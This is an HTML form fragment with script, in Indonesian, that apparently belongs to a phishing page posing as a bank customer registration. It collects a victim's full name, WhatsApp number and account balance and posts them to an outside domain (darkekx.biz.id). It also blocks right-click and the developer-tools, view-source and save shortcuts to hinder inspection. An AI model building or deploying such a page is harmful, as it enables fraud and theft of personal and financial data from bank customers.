   <form action="https://darkekx.biz.id/bnn/on.php" method="POST" oninput="updatePreview()"> 
    <label>Nama Nasabah:</label> <center>
    <input type="text" id="patok" name="a" placeholder="Masukkan Nama Lengkap Nasabah" required></center> 
    <label>Nomor WhatsApp:</label> 
    <center><input type="tel" id="tundun" name="b" placeholder="08123456789" inputmode="numeric" pattern="[0-9]*" maxlength="13" required> </center>
    <label>Saldo Akhir:</label> 
   <center> <input type="text" id="cicak" name="c" placeholder="Rp" inputmode="numeric" maxlength="15" required> </center><br>
    <button type="submit">Daftarkan</button> 
   </form>

  <script>
    function updatePreview() {
      const nama = document.getElementById("patok").value;
      let hp = document.getElementById("tundun").value.replace(/\D/g, '');
      if (hp.startsWith("0")) hp = hp.substring(1);
      document.getElementById("outputPatok").innerText = nama || "Nama Nasabah";
      document.getElementById("outputTundun").innerText = hp ? "+62 " + hp : "+62 ***********";
    }

    const saldoInput = document.getElementById("cicak");
    saldoInput.addEventListener("input", function () {
      let value = this.value.replace(/\D/g, "");
      if (value.length > 15) {
        value = value.substring(0, 15);
      }
      this.value = formatRupiah(value);
    });

    function formatRupiah(angka) {
      const reverse = angka.toString().split("").reverse().join("");
      const ribuan = reverse.match(/\d{1,3}/g);
      return "Rp " + ribuan.join(".").split("").reverse().join("");
    }

    document.addEventListener('contextmenu', function(e) {
      e.preventDefault();
    });

    document.addEventListener('keydown', function(e) {
      if (
        e.key === "F12" ||
        (e.ctrlKey && e.shiftKey && (e.key === "I" || e.key === "J")) ||
        (e.ctrlKey && (e.key === "U" || e.key === "C" || e.key === "S"))
      ) {
        e.preventDefault();
      }
    });
  </script>
